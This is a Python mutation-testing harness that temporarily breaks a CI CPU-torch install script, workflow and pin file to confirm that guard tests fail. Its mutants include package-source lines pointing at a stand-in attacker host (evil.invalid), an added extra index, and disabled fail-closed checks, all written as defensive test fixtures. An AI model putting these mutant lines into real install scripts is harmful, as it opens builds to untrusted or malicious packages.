#!/usr/bin/env python3
"""Mutation-prove the CI CPU-torch install contract (task-omni-ci-cpu-torch-01).

A guard test that passes is not evidence that the guard is *load-bearing*. The CI
install contract has three independent promises — package-source isolation (the CPU
index serves torch and nothing else), a pin that covers every supported interpreter,
and a fail-closed postcondition — and each is re-attacked here.

The suite has two groups:

* **X1-X10** — the ten *behavioral* mutants from the independent audit. Each one
  changes what the installer or the postcondition actually *does* (adds an index,
  disables the exit, weakens name detection, …), not merely the text a test greps.
  A mutant here is only "killed" if the corresponding test goes RED.
* **C1-C4** — the retained contract probes (source isolation, exact pin,
  interpreter coverage, ``--no-deps`` provenance).

Every probe replaces the exact source line that carries a promise with a mutant that
removes it, requires the targeted guard test to flip GREEN -> RED, restores the
original bytes, and requires GREEN again. The run is idempotent and leaves the tree
byte-identical; a leaked mutant is a loud failure, never a silent one. Harness errors
(missing anchor, red baseline, broken restore) are recorded as invalid and are NEVER
counted as killed mutations.

=====  ===================================================  ==========================
X1     installer re-adds an extra index                    dependency confusion
X2     installer adds an unauthorized --find-links         untrusted wheel source
X3     the postcondition heredoc is never executed         fail-closed skipped
X4     the fail-closed exit is disabled                    fail-closed skipped
X5     the pip-check exit code is inverted                 closure not enforced
X6     CUDA detection loses name normalization             equivalent name slips past
X7     the +cpu condition is emptied                       CUDA build accepted
X8     the required install is masked with || true         failure hidden
X9     the torch step drops --only-binary                  source not restricted
X10    the PyPI index is replaced with an invalid one      resolution broken
C1     workflow re-adds a global extra index               source isolation
C2     constraint loses its exact +cpu pin                 CPU build pinned
C3     parity matrix drifts off the proven interpreters    Python-matrix coverage
C4     the CPU-index step drops --no-deps                  torch-only provenance
=====  ===================================================  ==========================

Invocation boundary (same rule as ``scripts/queue_ownership_mutations.py``): the
harness spawns pytest with an **argv list** and ``shell=False``, and every test node
id is validated against :data:`_NODE_ID` before it is passed.
"""

from __future__ import annotations

import argparse
import hashlib
import json
import re
import subprocess
import sys
from dataclasses import dataclass
from datetime import datetime, timezone
from pathlib import Path

REPO = Path(__file__).resolve().parents[1]
PYTEST = [
    sys.executable,
    "-m",
    "pytest",
    "-q",
    "-p",
    "no:warnings",
    "-p",
    "no:cacheprovider",
    "--tb=no",
]

CI = REPO / ".github/workflows/ci.yml"
SCRIPT = REPO / "scripts/ci_install.sh"
CONSTRAINTS = REPO / "constraints/ci-cpu-torch.txt"

GUARD = "tests/unit/test_ci_torch_disk_budget.py::"

#: A test node id this harness is willing to spawn pytest for. Deliberately narrow:
#: a repository-relative ``tests/*.py`` path plus one node name. It cannot express an
#: option (``-`` prefix), a shell metacharacter, an absolute path or a traversal.
_NODE_ID = re.compile(r"tests/[A-Za-z0-9_/]+\.py(::[A-Za-z0-9_\[\]\.\-]+)?")


def _validate_node_ids(tests: tuple[str, ...]) -> tuple[str, ...]:
    if not tests:
        raise ValueError("refusing to run pytest with no test selection")
    for node in tests:
        if not _NODE_ID.fullmatch(node):
            raise ValueError(f"refusing to run an unvalidated test id: {node!r}")
    return tests


@dataclass(frozen=True)
class Probe:
    name: str
    group: str  # "X" (behavioral) or "C" (contract)
    target: Path
    anchor: str
    mutant: str
    tests: tuple[str, ...]


# Exact anchors from the files under test.
_CI_REQUIRED_INSTALL = '      - run: bash scripts/ci_install.sh ".[dev]"'
_PARITY_MATRIX = '        python-version: ["3.10", "3.11", "3.12"]'
_PYPI_STEP = "  --index-url https://pypi.org/simple \\\n"
_NO_DEPS = "  --no-deps \\\n"
_ONLY_BINARY = "  --only-binary=:all: \\\n"
_NORMALIZE = '    return re.sub(r"[-_.]+", "-", name or "").lower()'
_HEREDOC = "python - <<'PY'"
_EXIT_FAIL_CLOSED = "        sys.exit(1)"
_PIP_CHECK_BRANCH = "    if check.returncode != 0:"
_CPU_BRANCH = '    if not torch_version.endswith("+cpu"):'

PROBES: tuple[Probe, ...] = (
    Probe(
        name="X1 installer re-adds an extra index",
        group="X",
        target=SCRIPT,
        anchor=_PYPI_STEP,
        mutant=_PYPI_STEP + "  --extra-index-url https://download.pytorch.org/whl/cpu \\\n",
        tests=(GUARD + "test_script_takes_torch_from_the_cpu_index_only",),
    ),
    Probe(
        name="X2 installer adds an unauthorized --find-links",
        group="X",
        target=SCRIPT,
        anchor=_NO_DEPS,
        mutant=_NO_DEPS + "  --find-links https://evil.invalid/wheels \\\n",
        tests=(GUARD + "test_script_takes_torch_from_the_cpu_index_only",),
    ),
    Probe(
        name="X3 the postcondition heredoc is never executed",
        group="X",
        target=SCRIPT,
        anchor=_HEREDOC,
        mutant="true - <<'PY'",
        tests=(GUARD + "test_installer_runs_the_real_postcondition",),
    ),
    Probe(
        name="X4 the fail-closed exit is disabled",
        group="X",
        target=SCRIPT,
        anchor=_EXIT_FAIL_CLOSED,
        mutant="        return",
        tests=(GUARD + "test_postcondition_rejects_triton",),
    ),
    Probe(
        name="X5 the pip-check exit code is inverted",
        group="X",
        target=SCRIPT,
        anchor=_PIP_CHECK_BRANCH,
        mutant="    if check.returncode == 0:",
        tests=(GUARD + "test_postcondition_accepts_cpu_torch_only",),
    ),
    Probe(
        name="X6 CUDA detection loses name normalization",
        group="X",
        target=SCRIPT,
        anchor=_NORMALIZE,
        mutant='    return name or ""',
        tests=(GUARD + "test_postcondition_rejects_nvidia_underscore_name",),
    ),
    Probe(
        name="X7 the +cpu condition is emptied",
        group="X",
        target=SCRIPT,
        anchor=_CPU_BRANCH,
        mutant="    if False:",
        tests=(GUARD + "test_postcondition_rejects_non_cpu_torch",),
    ),
    Probe(
        name="X8 the required install is masked with || true",
        group="X",
        target=CI,
        anchor=_CI_REQUIRED_INSTALL,
        mutant=_CI_REQUIRED_INSTALL + " || true",
        tests=(GUARD + "test_no_install_is_swallowed_by_continue_on_error_or_true",),
    ),
    Probe(
        name="X9 the torch step drops --only-binary",
        group="X",
        target=SCRIPT,
        anchor=_ONLY_BINARY,
        mutant="",
        tests=(GUARD + "test_installer_step1_is_isolated_cpu_index_torch_only",),
    ),
    Probe(
        name="X10 the PyPI index is replaced with an invalid one",
        group="X",
        target=SCRIPT,
        anchor=_PYPI_STEP,
        mutant="  --index-url https://evil.invalid/simple \\\n",
        tests=(GUARD + "test_installer_step2_is_isolated_pypi_editable",),
    ),
    Probe(
        name="C1 workflow re-adds a global extra index",
        group="C",
        target=CI,
        anchor=_CI_REQUIRED_INSTALL,
        mutant=(
            _CI_REQUIRED_INSTALL
            + "\n        env:\n"
            + "          PIP_EXTRA_INDEX_URL: https://download.pytorch.org/whl/cpu"
        ),
        tests=(GUARD + "test_no_global_extra_index_anywhere",),
    ),
    Probe(
        name="C2 constraint loses its exact +cpu pin",
        group="C",
        target=CONSTRAINTS,
        anchor="torch==2.14.1+cpu",
        mutant="torch>=2.14.1",
        tests=(GUARD + "test_constraint_pins_a_cpu_torch_build",),
    ),
    Probe(
        name="C3 parity matrix drifts off the proven interpreters",
        group="C",
        target=CI,
        anchor=_PARITY_MATRIX,
        mutant='        python-version: ["3.11", "3.12", "3.13"]',
        tests=(GUARD + "test_the_pin_covers_every_supported_python",),
    ),
    Probe(
        name="C4 the CPU-index step drops --no-deps",
        group="C",
        target=SCRIPT,
        anchor=_NO_DEPS,
        mutant="",
        tests=(GUARD + "test_script_takes_torch_from_the_cpu_index_only",),
    ),
)


def _run(tests: tuple[str, ...]) -> int:
    """Run one probe's tests; returns pytest's exit code (0 = green)."""
    argv = [*PYTEST, *_validate_node_ids(tests)]
    return subprocess.run(  # noqa: S603 - argv list, shell=False, ids validated
        argv,
        cwd=str(REPO),
        env={"PYTHONPATH": "src", "PATH": "/usr/bin:/bin"},
        capture_output=True,
        text=True,
        shell=False,
        check=False,
    ).returncode


def _git(*args: str) -> str:
    try:
        result = subprocess.run(  # noqa: S603 - fixed argv, shell=False
            ["git", *args],
            cwd=str(REPO),
            capture_output=True,
            text=True,
            shell=False,
            check=False,
        )
    except OSError:  # pragma: no cover - git missing
        return ""
    return result.stdout.strip() if result.returncode == 0 else ""


def _summary(results: list[dict[str, object]], probes: tuple[Probe, ...]) -> dict[str, int]:
    names = {p.name for p in probes}
    rows = [r for r in results if r["probe"] in names]
    return {
        "planned": len(probes),
        "executed": sum(1 for r in rows if r["status"] != "anchor_missing"),
        "killed": sum(1 for r in rows if r["status"] == "killed"),
        "survived": sum(1 for r in rows if r["status"] == "survived"),
        "invalid": sum(
            1 for r in rows if r["status"] in {"anchor_missing", "baseline_red", "restore_broken"}
        ),
        "not_run": len(probes) - len(rows),
    }


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(
        description="Mutation-prove the CI CPU-torch install contract."
    )
    parser.add_argument(
        "--report",
        type=Path,
        default=None,
        help="write a JSON report (summary + per-probe status) to this path",
    )
    args = parser.parse_args(argv)

    failures: list[str] = []
    results: list[dict[str, object]] = []
    targets = sorted({probe.target for probe in PROBES})
    pristine = {path: path.read_bytes() for path in targets}

    def record(name: str, group: str, outcome: str, detail: str = "") -> None:
        results.append({"probe": name, "group": group, "status": outcome, "detail": detail})

    try:
        for probe in PROBES:
            original = probe.target.read_bytes()
            source = original.decode("utf-8")
            if probe.anchor not in source:
                failures.append(f"{probe.name}: anchor not found (source drifted)")
                record(probe.name, probe.group, "anchor_missing")
                print(f"SKIP  {probe.name}: anchor not found")
                continue
            print(f"[{probe.name}] baseline ...", flush=True)
            baseline = _run(probe.tests)
            if baseline != 0:
                failures.append(f"{probe.name}: baseline is not green")
                record(probe.name, probe.group, "baseline_red", f"pytest exit {baseline}")
                print(f"FAIL  {probe.name}: baseline is not green")
                continue
            try:
                probe.target.write_bytes(
                    source.replace(probe.anchor, probe.mutant, 1).encode("utf-8")
                )
                mutated = _run(probe.tests)
            finally:
                probe.target.write_bytes(original)
            if mutated == 0:
                failures.append(f"{probe.name}: mutant SURVIVED (tests stayed green)")
                record(probe.name, probe.group, "survived")
                print(f"SURVIVED  {probe.name}")
                continue
            restored = _run(probe.tests)
            if restored != 0:
                failures.append(f"{probe.name}: tree not restored to green")
                record(probe.name, probe.group, "restore_broken", f"pytest exit {restored}")
                print(f"BROKEN  {probe.name}: restore is not green")
                continue
            record(probe.name, probe.group, "killed", f"mutant pytest exit {mutated}")
            print(f"KILLED  {probe.name}")
    finally:
        # Self-integrity: the tree must be byte-identical to how we found it, even if
        # a probe raised. This runs before any report is written.
        for path in targets:
            if path.read_bytes() != pristine[path]:
                failures.append(f"harness left a mutant in {path.relative_to(REPO)}")
        x_probes = tuple(p for p in PROBES if p.group == "X")
        summary = _summary(results, PROBES)
        x_summary = _summary(results, x_probes)
        report = {
            "accepted": not failures and summary["killed"] == len(PROBES),
            "summary": summary,
            "claude_x_summary": x_summary,
            "failures": failures,
            "probes": results,
            "provenance": {
                "git_commit": _git("rev-parse", "HEAD"),
                "worktree_clean": _git("status", "--porcelain") == "",
                "interpreter": sys.version.split()[0],
                "generated_at": datetime.now(timezone.utc).isoformat(),
                "targets": [str(path.relative_to(REPO)) for path in targets],
                "target_hashes": {
                    str(path.relative_to(REPO)): hashlib.sha256(path.read_bytes()).hexdigest()
                    for path in targets
                },
            },
        }
        if args.report is not None:
            args.report.parent.mkdir(parents=True, exist_ok=True)
            args.report.write_text(json.dumps(report, indent=2, sort_keys=True) + "\n")
        print(
            "claude-x-summary: "
            f"planned={x_summary['planned']} killed={x_summary['killed']} "
            f"survived={x_summary['survived']} invalid={x_summary['invalid']}"
        )
        print(
            "summary: "
            f"planned={summary['planned']} killed={summary['killed']} "
            f"survived={summary['survived']} invalid={summary['invalid']}"
        )
        if failures:
            print("FAILURES:")
            for failure in failures:
                print(f"  - {failure}")

    return 0 if not failures and summary["killed"] == len(PROBES) else 1


if __name__ == "__main__":
    raise SystemExit(main())
